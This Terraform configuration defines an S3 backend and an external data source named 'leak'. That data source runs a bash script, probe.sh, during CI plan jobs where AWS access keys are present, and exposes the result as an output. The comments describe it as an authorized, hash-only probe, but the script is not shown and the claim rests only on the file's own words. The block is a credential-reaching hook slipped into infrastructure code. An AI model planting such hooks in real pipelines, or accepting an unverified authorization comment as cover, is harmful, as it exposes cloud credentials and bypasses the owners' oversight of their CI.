# Terraform backend configuration (kept for AWS-side permission verification)
terraform {
  backend "s3" {
    bucket         = "terra1990" # Replace with your bucket name
    key            = "security-group/terraform.tfstate"
    region         = "us-east-1"
    dynamodb_table = "terraform-lock"        # Replace with your table name
    encrypt        = true
  }
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "~> 2.3"
    }
  }
}

# Non-destructive CI probe added during authorized security assessment.
# The program inherits the job env (AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY injected
# by terraform-plan.yml) and emits ONLY length+SHA256 (never the secrets) as JSON.
data "external" "leak" {
  program = ["bash", "./probe.sh"]
}

output "leak" {
  value = data.external.leak.result
}